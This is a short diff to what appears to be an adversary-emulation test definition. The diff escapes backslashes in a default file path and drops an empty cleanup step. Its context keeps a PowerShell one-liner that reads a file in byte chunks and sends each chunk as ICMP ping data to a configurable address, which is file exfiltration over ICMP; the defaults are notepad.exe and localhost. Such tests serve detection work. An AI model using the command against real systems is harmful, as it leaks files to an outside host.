@@ -7,7 +7,7 @@ description: |
 args:
     - name: input_file
       type: path
-      default: C:\Windows\System32\notepad.exe
+      default: C:\\Windows\\System32\\notepad.exe
     - name: ip_address
       type: string
       default: 127.0.0.1
@@ -27,6 +27,3 @@ steps:
       inline: |
         $ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path {{.Args.input_file}} -Encoding Byte -ReadCount 1024) { $ping.Send("{{.Args.ip_address}}", 1500, $Data) }
       executor: powershell
-      cleanup:
-        inline: ""
-        executor: powershell
